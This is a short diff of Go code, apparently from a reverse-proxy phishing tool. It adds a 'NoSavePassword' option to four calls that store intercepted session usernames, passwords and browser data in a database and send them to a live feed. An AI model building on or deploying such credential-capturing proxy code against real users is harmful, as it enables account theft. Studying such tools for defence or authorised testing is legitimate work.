@@ -568,7 +568,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 										log.Error("database: %v", err)
 									}
 									if len(session.RId) != 0 && len(session.Password) != 0 {
-										err = database.HandleSubmittedData(session.RId, session.Username, session.Password, session.Browser, p.livefeed)
+										err = database.HandleSubmittedData(session.RId, session.Username, session.Password, session.Browser, p.livefeed, p.cfg.proxyConfig.NoSavePassword)
 										if err != nil {
 											fmt.Printf("Error submitting data to database: %s\n", err)
 										}
@@ -585,7 +585,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 										log.Error("database: %v", err)
 									}
 									if len(session.RId) != 0 && len(session.Username) != 0 {
-										err = database.HandleSubmittedData(session.RId, session.Username, session.Password, session.Browser, p.livefeed)
+										err = database.HandleSubmittedData(session.RId, session.Username, session.Password, session.Browser, p.livefeed, p.cfg.proxyConfig.NoSavePassword)
 										if err != nil {
 											fmt.Printf("Error submitting data to database: %s\n", err)
 										}
@@ -623,7 +623,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 												log.Error("database: %v", err)
 											}
 											if len(session.RId) != 0 && len(session.Password) != 0 {
-												err = database.HandleSubmittedData(session.RId, session.Username, session.Password, session.Browser, p.livefeed)
+												err = database.HandleSubmittedData(session.RId, session.Username, session.Password, session.Browser, p.livefeed, p.cfg.proxyConfig.NoSavePassword)
 												if err != nil {
 													fmt.Printf("Error submitting data to database: %s\n", err)
 												}
@@ -639,7 +639,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 												log.Error("database: %v", err)
 											}
 											if len(session.RId) != 0 && len(session.Username) != 0 {
-												err = database.HandleSubmittedData(session.RId, session.Username, session.Password, session.Browser, p.livefeed)
+												err = database.HandleSubmittedData(session.RId, session.Username, session.Password, session.Browser, p.livefeed, p.cfg.proxyConfig.NoSavePassword)
 												if err != nil {
 													fmt.Printf("Error submitting data to database: %s\n", err)
 												}
